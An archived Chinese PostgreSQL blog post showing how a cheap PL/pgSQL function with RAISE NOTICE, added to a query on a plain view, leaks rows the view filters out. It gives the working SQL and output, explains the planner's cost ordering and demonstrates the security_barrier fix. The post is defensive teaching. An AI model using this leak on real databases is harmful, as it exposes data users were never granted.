<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=gbk">
<title>PostgreSQL research</title>
<style type="text/css">
.blogcnt{line-height:160%;font-size:14px;text-align:left;word-wrap:break-word;}
.blogcnt *{line-height:160%;}
.blogcnt p{margin:0 0 10px;}
.blogcnt ul,.nbw-blog ol{margin:5px 0 5px 40px;padding:0}
.blogcnt em{font-style:italic;}
.blogcnt blockquote{font-size:1em;margin:auto 0 auto 35px;}
.blogcnt img{border:0;max-width:100%;}
</style>
</head>
<body style="color:#444444;">
<h1 id="blog-Title"><a href="index.html">PostgreSQL research</a></h1>
<div id="" style="padding:0 20px;">
	<h2 id="">PostgreSQL views privilege attack and security with security_barrier</h2>
	<h5 id="">2013-07-10 15:43:33&nbsp;&nbsp;&nbsp;<a href="http://blog.163.com/digoal@126/blog/static/163877040201361031431669/" target="_blank">查看原文&gt;&gt;</a></h5>
	<div class="" id="" style="padding:0 20px;">
		<div class="blogcnt" style="width:800px;"><div>数据库中一般可以使用视图来规避用户的访问数据的范围, 但是要注意, 即使使用了视图, 也不一定能规避访问.</div><div>例如带where条件的视图就有可能被攻击者利用执行树先执行成本低后执行成本高的规则, 使用低成本函数的raise窃取本来不应该看到的信息.</div><div>举例如下 :&nbsp;</div><div>创建测试表, 插入测试数据.</div><div><pre class="prettyprint"   ><p></p><div><font size="2"   >digoal=# create table userinfo(id int, groupid int, username text, age int, addr text, email text, phone text);</font></div><div><font size="2"   >CREATE TABLE</font></div><div><font size="2"   >digoal=# insert into userinfo values (1, 1, 'digoal', 1000, '杭州西湖区', 'digoal@126.com', '13999999999');</font></div><div><font size="2"   >INSERT 0 1</font></div><div><font size="2"   >digoal=# insert into userinfo values (2, 1, 'test', 1000, '火星', 'digoal@126.com', '11999999999');</font></div><div><font size="2"   >INSERT 0 1</font></div><div><font size="2"   >digoal=# insert into userinfo values (3, 1, 'test', 1000, '月球', 'digoal@126.com', '11999999999');</font></div><div><font size="2"   >INSERT 0 1</font></div><div><font size="2"   >digoal=# insert into userinfo values (4, 2, 'test', 1000, '土星', 'digoal@126.com', '11999999999');</font></div><div><font size="2"   >INSERT 0 1</font></div><p></p></pre></div><div>创建一个视图, 仅仅可以查看groupid=2的数据.</div><div><pre class="prettyprint"   ><p></p><div><font size="2"   >digoal=# create view v_userinfo as select * from userinfo where groupid =2;</font></div><div><font size="2"   >CREATE VIEW</font></div><p></p></pre></div><div>使用普通用户查看表和视图, 现在没有权限查看.</div><div><pre class="prettyprint"   ><p></p><div><font size="2"   >digoal=# \c digoal digoal</font></div><div><div><font size="2"   >You are now connected to database "digoal" as user "digoal".</font></div><div><font size="2"   >digoal=&gt; select * from userinfo;</font></div><div><font size="2"   >ERROR: &nbsp;permission denied for relation userinfo</font></div><div><font size="2"   >digoal=&gt; select * from v_userinfo;</font></div><div><font size="2"   >ERROR: &nbsp;permission denied for relation v_userinfo</font></div></div><p></p></pre></div><div>分配视图的查询权限给普通用户</div><div><div><pre class="prettyprint"   ><p></p><div><font size="2"   >digoal=&gt; \c digoal postgres</font></div><div><font size="2"   >You are now connected to database "digoal" as user "postgres".</font></div><div><font size="2"   >digoal=# grant select on v_userinfo to digoal;</font></div><div><font size="2"   >GRANT</font></div><p></p></pre></div><div>现在普通用户不能直接访问表, 但是可以访问视图了.</div><div><pre class="prettyprint"   ><p></p><div><div><font size="2"   >digoal=# \c digoal digoal</font></div></div><div><div><font size="2"   >You are now connected to database "digoal" as user "digoal".</font></div><div><font size="2"   >digoal=&gt; select * from userinfo ;</font></div><div><font size="2"   >ERROR: &nbsp;permission denied for relation userinfo</font></div></div><p></p></pre></div></div><div><div>看起来普通用户只能访问groupid=2的数据.</div><div><pre class="prettyprint"   ><p></p><div><font size="2"   >digoal=&gt; select * from v_userinfo ;</font></div><div><font size="2"   >&nbsp;id | groupid | username | age &nbsp;| addr | &nbsp; &nbsp; email &nbsp; &nbsp; &nbsp;| &nbsp; &nbsp;phone &nbsp; &nbsp;</font></div><div><font size="2"   >----+---------+----------+------+------+----------------+-------------</font></div><div><font size="2"   >&nbsp; 4 | &nbsp; &nbsp; &nbsp; 2 | test &nbsp; &nbsp; | 1000 | 土星 | digoal@126.com | 11999999999</font></div><div><font size="2"   >(1 row)</font></div><p></p></pre></div></div><div>但是利用以下方法, 欺骗rule, 得到不应该看到的数据.</div><div><pre class="prettyprint"   ><p></p><div><font size="2"   >digoal=&gt; create or replace function attack(int,int,text,int,text,text,text) returns boolean as $$</font></div><div><font size="2"   >declare</font></div><div><font size="2"   >begin</font></div><div><font size="2"   >&nbsp; raise notice '%,%,%,%,%,%,%', $1,$2,$3,$4,$5,$6,$7;</font></div><div><font size="2"   >&nbsp; return true;</font></div><div><font size="2"   >end;</font></div><div><font size="2"   >$$ language plpgsql cost 0.00000000000000000000001;</font></div><div><font size="2"   >CREATE FUNCTION</font></div><div><font size="2"   >digoal=&gt; select * from v_userinfo where attack(id,groupid,username,age,addr,email,phone);</font></div><div><font size="2"   >NOTICE: &nbsp;1,1,digoal,1000,杭州西湖区,digoal@126.com,13999999999</font></div><div><font size="2"   >NOTICE: &nbsp;2,1,test,1000,火星,digoal@126.com,11999999999</font></div><div><font size="2"   >NOTICE: &nbsp;3,1,test,1000,月球,digoal@126.com,11999999999</font></div><div><font size="2"   >NOTICE: &nbsp;4,2,test,1000,土星,digoal@126.com,11999999999</font></div><div><font size="2"   >&nbsp;id | groupid | username | age &nbsp;| addr | &nbsp; &nbsp; email &nbsp; &nbsp; &nbsp;| &nbsp; &nbsp;phone &nbsp; &nbsp;</font></div><div><font size="2"   >----+---------+----------+------+------+----------------+-------------</font></div><div><font size="2"   >&nbsp; 4 | &nbsp; &nbsp; &nbsp; 2 | test &nbsp; &nbsp; | 1000 | 土星 | digoal@126.com | 11999999999</font></div><div><font size="2"   >(1 row)</font></div><p></p></pre></div><div>从以上结果可以看到, 本来不应该看到的groupid=1的数据也被打印出来了.</div><div>而且执行计划并没有什么异样.</div><div><pre class="prettyprint"   ><p></p><div><font size="2"   >digoal=&gt; explain (analyze,verbose,costs,buffers,timing) select * from v_userinfo where attack(id,groupid,username,age,addr,email,phone);</font></div><div><font size="2"   >NOTICE: &nbsp;1,1,digoal,1000,杭州西湖区,digoal@126.com,13999999999</font></div><div><font size="2"   >NOTICE: &nbsp;2,1,test,1000,火星,digoal@126.com,11999999999</font></div><div><font size="2"   >NOTICE: &nbsp;3,1,test,1000,月球,digoal@126.com,11999999999</font></div><div><font size="2"   >NOTICE: &nbsp;4,2,test,1000,土星,digoal@126.com,11999999999</font></div><div><font size="2"   >&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; QUERY PLAN &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</font></div><div><font size="2"   >&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</font></div><div><font size="2"   >------------------------------------------------------------------------------------------------------------------------------------</font></div><div><font size="2"   >--------------------------</font></div><div><font size="2"   >&nbsp;Seq Scan on public.userinfo &nbsp;(cost=0.00..16.00 rows=1 width=140) (actual time=0.090..0.091 rows=1 loops=1)</font></div><div><font size="2"   >&nbsp; &nbsp;Output: userinfo.id, userinfo.groupid, userinfo.username, userinfo.age, userinfo.addr, userinfo.email, userinfo.phone</font></div><div><font size="2"   >&nbsp; &nbsp;Filter: (attack(userinfo.id, userinfo.groupid, userinfo.username, userinfo.age, userinfo.addr, userinfo.email, userinfo.phone) AN</font></div><div><font size="2"   >D (userinfo.groupid = 2))</font></div><div><font size="2"   >&nbsp; &nbsp;Rows Removed by Filter: 3</font></div><div><font size="2"   >&nbsp; &nbsp;Buffers: shared hit=1</font></div><div><font size="2"   >&nbsp;Total runtime: 0.113 ms</font></div><div><font size="2"   >(6 rows)</font></div><p></p></pre></div><div><br></div><div>那这是为什么呢?</div><div><pre class="prettyprint"   ><p><font size="2"   >Every person and phone number in the phone_data table will be printed as a NOTICE, because the planner will choose to execute the inexpensive tricky function before the more expensive NOT LIKE. Even if the user is prevented from defining new functions, built-in functions can be used in similar attacks. (For example, most casting functions include their input values in the error messages they produce.)</font></p></pre></div><div>原因是PostgreSQL在生成执行树时, 先执行成本低的再执行成本高的. 在本例就是说先执行成本低的函数attack, 再执行成本高的groupid=2;</div><div>=的成本是多少怎么看 :&nbsp;</div><div>=在这里是指的哪个函数呢?</div><div><pre class="prettyprint"   ><p></p><div><font size="2"   >digoal=&gt; select * from pg_operator where oprname='=' and oprleft=23 and oprright=23;</font></div><div><font size="2"   >&nbsp;oprname | oprnamespace | oprowner | oprkind | oprcanmerge | oprcanhash | oprleft | oprright | oprresult | oprcom | oprnegate | oprc</font></div><div><font size="2"   >ode | oprrest | &nbsp;oprjoin &nbsp;</font></div><div><font size="2"   >---------+--------------+----------+---------+-------------+------------+---------+----------+-----------+--------+-----------+-----</font></div><div><font size="2"   >----+---------+-----------</font></div><div><font size="2"   >&nbsp;= &nbsp; &nbsp; &nbsp; | &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 11 | &nbsp; &nbsp; &nbsp; 10 | b &nbsp; &nbsp; &nbsp; | t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| &nbsp; &nbsp; &nbsp;23 | &nbsp; &nbsp; &nbsp; 23 | &nbsp; &nbsp; &nbsp; &nbsp;16 | &nbsp; &nbsp; 96 | &nbsp; &nbsp; &nbsp; 518 | int4</font></div><div><font size="2"   >eq &nbsp;| eqsel &nbsp; | eqjoinsel</font></div><div><font size="2"   >(1 row)</font></div><p></p></pre></div><div>查看这个操作符的成本 :&nbsp;</div><div><pre class="prettyprint"   ><p></p><div><font size="2"   >digoal=&gt; select * from pg_proc where proname='int4eq';</font></div><div><font size="2"   >-[ RECORD 1 ]---+-------</font></div><div><font size="2"   >proname &nbsp; &nbsp; &nbsp; &nbsp; | int4eq</font></div><div><font size="2"   >pronamespace &nbsp; &nbsp;| 11</font></div><div><font size="2"   >proowner &nbsp; &nbsp; &nbsp; &nbsp;| 10</font></div><div><font size="2"   >prolang &nbsp; &nbsp; &nbsp; &nbsp; | 12</font></div><div><font size="2"   >procost &nbsp; &nbsp; &nbsp; &nbsp; | 1</font></div><div><font size="2"   >prorows &nbsp; &nbsp; &nbsp; &nbsp; | 0</font></div><div><font size="2"   >provariadic &nbsp; &nbsp; | 0</font></div><div><font size="2"   >protransform &nbsp; &nbsp;| -</font></div><div><font size="2"   >proisagg &nbsp; &nbsp; &nbsp; &nbsp;| f</font></div><div><font size="2"   >proiswindow &nbsp; &nbsp; | f</font></div><div><font size="2"   >prosecdef &nbsp; &nbsp; &nbsp; | f</font></div><div><font size="2"   >proleakproof &nbsp; &nbsp;| t</font></div><div><font size="2"   >proisstrict &nbsp; &nbsp; | t</font></div><div><font size="2"   >proretset &nbsp; &nbsp; &nbsp; | f</font></div><div><font size="2"   >provolatile &nbsp; &nbsp; | i</font></div><div><font size="2"   >pronargs &nbsp; &nbsp; &nbsp; &nbsp;| 2</font></div><div><font size="2"   >pronargdefaults | 0</font></div><div><font size="2"   >prorettype &nbsp; &nbsp; &nbsp;| 16</font></div><div><font size="2"   >proargtypes &nbsp; &nbsp; | 23 23</font></div><div><font size="2"   >proallargtypes &nbsp;|&nbsp;</font></div><div><font size="2"   >proargmodes &nbsp; &nbsp; |&nbsp;</font></div><div><font size="2"   >proargnames &nbsp; &nbsp; |&nbsp;</font></div><div><font size="2"   >proargdefaults &nbsp;|&nbsp;</font></div><div><font size="2"   >prosrc &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| int4eq</font></div><div><font size="2"   >probin &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp;</font></div><div><font size="2"   >proconfig &nbsp; &nbsp; &nbsp; |&nbsp;</font></div><div><font size="2"   >proacl &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp;</font></div><p></p></pre></div><div>注意成本是real类型</div><div><pre class="prettyprint"   ><p></p><div><font size="2"   >digoal=&gt; \d pg_proc</font></div><div><font size="2"   >&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Table "pg_catalog.pg_proc"</font></div><div><font size="2"   >&nbsp; &nbsp; &nbsp;Column &nbsp; &nbsp; &nbsp;| &nbsp; &nbsp; Type &nbsp; &nbsp; | Modifiers&nbsp;</font></div><div><font size="2"   >-----------------+--------------+-----------</font></div><div><font size="2"   >&nbsp;proname &nbsp; &nbsp; &nbsp; &nbsp; | name &nbsp; &nbsp; &nbsp; &nbsp; | not null</font></div><div><font size="2"   >&nbsp;pronamespace &nbsp; &nbsp;| oid &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| not null</font></div><div><font size="2"   >&nbsp;proowner &nbsp; &nbsp; &nbsp; &nbsp;| oid &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| not null</font></div><div><font size="2"   >&nbsp;prolang &nbsp; &nbsp; &nbsp; &nbsp; | oid &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| not null</font></div><div><font size="2"   >&nbsp;procost &nbsp; &nbsp; &nbsp; &nbsp; | real &nbsp; &nbsp; &nbsp; &nbsp; | not null</font></div><div><font size="2"   >&nbsp;prorows &nbsp; &nbsp; &nbsp; &nbsp; | real &nbsp; &nbsp; &nbsp; &nbsp; | not null</font></div><div><font size="2"   >&nbsp;provariadic &nbsp; &nbsp; | oid &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| not null</font></div><div><font size="2"   >&nbsp;protransform &nbsp; &nbsp;| regproc &nbsp; &nbsp; &nbsp;| not null</font></div><div><font size="2"   >&nbsp;proisagg &nbsp; &nbsp; &nbsp; &nbsp;| boolean &nbsp; &nbsp; &nbsp;| not null</font></div><div><font size="2"   >&nbsp;proiswindow &nbsp; &nbsp; | boolean &nbsp; &nbsp; &nbsp;| not null</font></div><div><font size="2"   >&nbsp;prosecdef &nbsp; &nbsp; &nbsp; | boolean &nbsp; &nbsp; &nbsp;| not null</font></div><div><font size="2"   >&nbsp;proleakproof &nbsp; &nbsp;| boolean &nbsp; &nbsp; &nbsp;| not null</font></div><div><font size="2"   >&nbsp;proisstrict &nbsp; &nbsp; | boolean &nbsp; &nbsp; &nbsp;| not null</font></div><div><font size="2"   >&nbsp;proretset &nbsp; &nbsp; &nbsp; | boolean &nbsp; &nbsp; &nbsp;| not null</font></div><div><font size="2"   >&nbsp;provolatile &nbsp; &nbsp; | "char" &nbsp; &nbsp; &nbsp; | not null</font></div><div><font size="2"   >&nbsp;pronargs &nbsp; &nbsp; &nbsp; &nbsp;| smallint &nbsp; &nbsp; | not null</font></div><div><font size="2"   >&nbsp;pronargdefaults | smallint &nbsp; &nbsp; | not null</font></div><div><font size="2"   >&nbsp;prorettype &nbsp; &nbsp; &nbsp;| oid &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| not null</font></div><div><font size="2"   >&nbsp;proargtypes &nbsp; &nbsp; | oidvector &nbsp; &nbsp;| not null</font></div><div><font size="2"   >&nbsp;proallargtypes &nbsp;| oid[] &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp;</font></div><div><font size="2"   >&nbsp;proargmodes &nbsp; &nbsp; | "char"[] &nbsp; &nbsp; |&nbsp;</font></div><div><font size="2"   >&nbsp;proargnames &nbsp; &nbsp; | text[] &nbsp; &nbsp; &nbsp; |&nbsp;</font></div><div><font size="2"   >&nbsp;proargdefaults &nbsp;| pg_node_tree |&nbsp;</font></div><div><font size="2"   >&nbsp;prosrc &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| text &nbsp; &nbsp; &nbsp; &nbsp; |&nbsp;</font></div><div><font size="2"   >&nbsp;probin &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| text &nbsp; &nbsp; &nbsp; &nbsp; |&nbsp;</font></div><div><font size="2"   >&nbsp;proconfig &nbsp; &nbsp; &nbsp; | text[] &nbsp; &nbsp; &nbsp; |&nbsp;</font></div><div><font size="2"   >&nbsp;proacl &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| aclitem[] &nbsp; &nbsp;|&nbsp;</font></div><div><font size="2"   >Indexes:</font></div><div><font size="2"   >&nbsp; &nbsp; "pg_proc_oid_index" UNIQUE, btree (oid)</font></div><div><font size="2"   >&nbsp; &nbsp; "pg_proc_proname_args_nsp_index" UNIQUE, btree (proname, proargtypes, pronamespace)</font></div><p></p></pre></div><div>从以上查询可以看出本例的groupid=2中的=使用的是int4eq函数, 这个函数的cost=1;</div><div>所以只要attack函数的cost小于int4eq就肯定会被先执行.</div><div><div><pre class="prettyprint"   ><p></p><div><font size="2"   >digoal=&gt; select * from v_userinfo where attack(id,groupid,username,age,addr,email,phone);</font></div><div><font size="2"   >NOTICE: &nbsp;1,1,digoal,1000,杭州西湖区,digoal@126.com,13999999999</font></div><div><font size="2"   >NOTICE: &nbsp;2,1,test,1000,火星,digoal@126.com,11999999999</font></div><div><font size="2"   >NOTICE: &nbsp;3,1,test,1000,月球,digoal@126.com,11999999999</font></div><div><font size="2"   >NOTICE: &nbsp;4,2,test,1000,土星,digoal@126.com,11999999999</font></div><div><font size="2"   >-[ RECORD 1 ]------------</font></div><div><font size="2"   >id &nbsp; &nbsp; &nbsp; | 4</font></div><div><font size="2"   >groupid &nbsp;| 2</font></div><div><font size="2"   >username | test</font></div><div><font size="2"   >age &nbsp; &nbsp; &nbsp;| 1000</font></div><div><font size="2"   >addr &nbsp; &nbsp; | 土星</font></div><div><font size="2"   >email &nbsp; &nbsp;| digoal@126.com</font></div><div><font size="2"   >phone &nbsp; &nbsp;| 11999999999</font></div><p></p></pre></div><div>将attack的成本改为1.1, 就不会先执行了.</div><div><pre class="prettyprint"   ><p></p><div><font size="2"   >digoal=&gt; create or replace function attack(int,int,text,int,text,text,text) returns boolean as $$</font></div><div><font size="2"   >declare</font></div><div><font size="2"   >begin</font></div><div><font size="2"   >&nbsp; raise notice '%,%,%,%,%,%,%', $1,$2,$3,$4,$5,$6,$7;</font></div><div><font size="2"   >&nbsp; return true;</font></div><div><font size="2"   >end;</font></div><div><font size="2"   >$$ language plpgsql cost 1.1;</font></div><div><font size="2"   >CREATE FUNCTION</font></div><p></p></pre></div><div>改成1.1后, 显然不能查看到groupid&lt;&gt;2的数据了.</div><div><pre class="prettyprint"   ><p></p><div><font size="2"   >digoal=&gt; select * from v_userinfo where attack(id,groupid,username,age,addr,email,phone);</font></div><div><font size="2"   >NOTICE: &nbsp;4,2,test,1000,土星,digoal@126.com,11999999999</font></div><div><font size="2"   >-[ RECORD 1 ]------------</font></div><div><font size="2"   >id &nbsp; &nbsp; &nbsp; | 4</font></div><div><font size="2"   >groupid &nbsp;| 2</font></div><div><font size="2"   >username | test</font></div><div><font size="2"   >age &nbsp; &nbsp; &nbsp;| 1000</font></div><div><font size="2"   >addr &nbsp; &nbsp; | 土星</font></div><div><font size="2"   >email &nbsp; &nbsp;| digoal@126.com</font></div><div><font size="2"   >phone &nbsp; &nbsp;| 11999999999</font></div><p></p></pre></div></div><div><br></div><div>建立安全的视图, 使用security_barrier选项 :&nbsp;</div><div><pre class="prettyprint"   ><p></p><div><div><font size="2"   >digoal=# create view v_userinfo_1 with(security_barrier) as select * from userinfo where id=2;</font></div><div><font size="2"   >CREATE VIEW</font></div><div><font size="2"   >digoal=# grant select on v_userinfo_1 to digoal;</font></div><div><font size="2"   >GRANT</font></div><div><font size="2"   >digoal=# \c digoal digoal</font></div></div><div><div><font size="2"   >You are now connected to database "digoal" as user "digoal".</font></div><div><font size="2"   >digoal=&gt; create or replace function attack(int,int,text,int,text,text,text) returns boolean as $$</font></div><div><font size="2"   >declare</font></div><div><font size="2"   >begin</font></div><div><font size="2"   >&nbsp; raise notice '%,%,%,%,%,%,%', $1,$2,$3,$4,$5,$6,$7;</font></div><div><font size="2"   >&nbsp; return true;</font></div><div><font size="2"   >end;</font></div><div><font size="2"   >$$ language plpgsql cost 0.1;</font></div><div><font size="2"   >CREATE FUNCTION</font></div></div><p></p></pre></div><div><div>查看非安全视图, 依旧欺骗.</div><div><pre class="prettyprint"   ><p></p><div><font size="2"   >digoal=&gt; select * from v_userinfo where attack(id,groupid,username,age,addr,email,phone);</font></div><div><font size="2"   >NOTICE: &nbsp;1,1,digoal,1000,杭州西湖区,digoal@126.com,13999999999</font></div><div><font size="2"   >NOTICE: &nbsp;2,1,test,1000,火星,digoal@126.com,11999999999</font></div><div><font size="2"   >NOTICE: &nbsp;3,1,test,1000,月球,digoal@126.com,11999999999</font></div><div><font size="2"   >NOTICE: &nbsp;4,2,test,1000,土星,digoal@126.com,11999999999</font></div><div><font size="2"   >&nbsp;id | groupid | username | age &nbsp;| addr | &nbsp; &nbsp; email &nbsp; &nbsp; &nbsp;| &nbsp; &nbsp;phone &nbsp; &nbsp;</font></div><div><font size="2"   >----+---------+----------+------+------+----------------+-------------</font></div><div><font size="2"   >&nbsp; 4 | &nbsp; &nbsp; &nbsp; 2 | test &nbsp; &nbsp; | 1000 | 土星 | digoal@126.com | 11999999999</font></div><div><font size="2"   >(1 row)</font></div><p></p></pre></div><div>查看安全视图, 无法被欺骗了.</div><div><pre class="prettyprint"   ><p></p><div><font size="2"   >digoal=&gt; select * from v_userinfo_1 where attack(id,groupid,username,age,addr,email,phone);</font></div><div><font size="2"   >NOTICE: &nbsp;2,1,test,1000,火星,digoal@126.com,11999999999</font></div><div><font size="2"   >&nbsp;id | groupid | username | age &nbsp;| addr | &nbsp; &nbsp; email &nbsp; &nbsp; &nbsp;| &nbsp; &nbsp;phone &nbsp; &nbsp;</font></div><div><font size="2"   >----+---------+----------+------+------+----------------+-------------</font></div><div><font size="2"   >&nbsp; 2 | &nbsp; &nbsp; &nbsp; 1 | test &nbsp; &nbsp; | 1000 | 火星 | digoal@126.com | 11999999999</font></div><div><font size="2"   >(1 row)</font></div><p></p></pre></div></div><div><br></div><div>[其他]</div><div>1. 由于使用security_barriers选项后优化器不起作用, 只走seqscan, 是个巨大缺陷, PostgreSQL 9.4将新增Row-Level-Security补丁 . 规避这个问题.</div><div>参考</div><div><a href="http://blog.163.com/digoal@126/blog/static/163877040201362402650341/"   >http://blog.163.com/digoal@126/blog/static/163877040201362402650341/</a></div><div><br></div>[参考]<wbr><div>1.&nbsp;<a style="line-height: 22px;" rel="nofollow" href="http://www.postgresql.org/docs/9.3/static/rules-privileges.html"   >http://www.postgresql.org/docs/9.3/static/rules-privileges.html</a></div>2.&nbsp;<a href="http://blog.163.com/digoal@126/blog/static/163877040201362402650341/"   >http://blog.163.com/digoal@126/blog/static/163877040201362402650341/</a><div>
<a rel="nofollow" href="http://info.flagcounter.com/h9V1"   ><img title="PostgreSQL views privilege attack and security with security_barrier - 德哥@Digoal - PostgreSQL"   src="http://s03.flagcounter.com/count/h9V1/bg_FFFFFF/txt_000000/border_CCCCCC/columns_2/maxflags_12/viewers_0/labels_0/pageviews_0/flags_0/"   alt="Flag Counter"   border="0"   ></a><br></div></div>
	</div>
</div>
</body>
</html>